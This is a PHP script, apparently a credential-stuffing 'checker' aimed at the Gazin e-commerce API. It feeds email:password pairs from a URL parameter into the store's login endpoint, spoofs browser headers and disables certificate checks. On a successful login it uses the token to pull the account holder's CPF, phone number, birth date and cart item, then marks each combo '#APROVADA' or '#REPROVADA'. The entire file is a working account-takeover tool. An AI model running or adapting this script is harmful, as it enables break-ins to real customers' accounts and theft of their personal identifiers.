<?php
error_reporting(0);

function multi($delimiters, $string) {

$um = str_replace($delimiters, $delimiters[0], $string);

$dois = explode($delimiters[0], $um);

return $dois;}


$lista = $_GET['lista'];

$email = multi(array("|", ":", ">", "<"), $lista)[0];
$senha = multi(array("|", ":", ">", "<"), $lista)[1];

function puxa($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];}




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ecommerce-api.gazin.com.br/v1/canais/login');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: ecommerce-api.gazin.com.br';
$headers[] = 'access-control-allow-origin: *';
$headers[] = 'access-control-allow-headers: *';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
$headers[] = 'canal: gazin-ecommerce';
$headers[] = 'content-type: application/json;charset=utf-8';
$headers[] = 'accept: */*';
$headers[] = 'sec-gpc: 1';
$headers[] = 'accept-language: pt-BR,pt;q=0.6';
$headers[] = 'origin: https://www.gazin.com.br';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.gazin.com.br/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","email":"'.$email.'"}');
echo$curl = curl_exec($ch);
curl_close($ch);


$nome = puxa($curl,'user_name":"','"');
$token = puxa($curl,'access_token":"','"');







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ecommerce-api.gazin.com.br/v1/canais/consumidores');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: ecommerce-api.gazin.com.br';
$headers[] = 'access-control-allow-origin: *';
$headers[] = 'access-control-allow-headers: *';
$headers[] = 'authorization: Bearer '.$token.'';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
$headers[] = 'canal: gazin-ecommerce';
$headers[] = 'content-type: application/json;charset=utf-8';
$headers[] = 'accept: */*';
$headers[] = 'sec-gpc: 1';
$headers[] = 'accept-language: pt-BR,pt;q=0.6';
$headers[] = 'origin: https://www.gazin.com.br';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.gazin.com.br/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl1 = curl_exec($ch);
curl_close($ch);


$cpf = puxa($curl1,'cpf":"','"');
$tel = puxa($curl1,'telefone":"','"');
$dd = puxa($curl1,'telefone_ddd":"','"');
$nasc = puxa($curl1,'data_nascimento":"','"');













$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ecommerce-api.gazin.com.br/v2/canais/carrinho/usuario');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: ecommerce-api.gazin.com.br';
$headers[] = 'access-control-allow-origin: *';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'access-control-allow-headers: *';
$headers[] = 'authorization: Bearer '.$token.'';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
$headers[] = 'canal: gazin-ecommerce';
$headers[] = 'sec-gpc: 1';
$headers[] = 'accept-language: pt-BR,pt;q=0.6';
$headers[] = 'origin: https://www.gazin.com.br';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.gazin.com.br/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl2 = curl_exec($ch);
curl_close($ch);

$card = puxa($curl2,'titulo_produto":"','"');

if(strpos($curl,'user_name":"')){
	
	
	echo "<div class='badge badge-success'>#APROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b></p>";
	
	}else{

echo "<div class='badge badge-danger'>#REPROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b></p>";





}


?>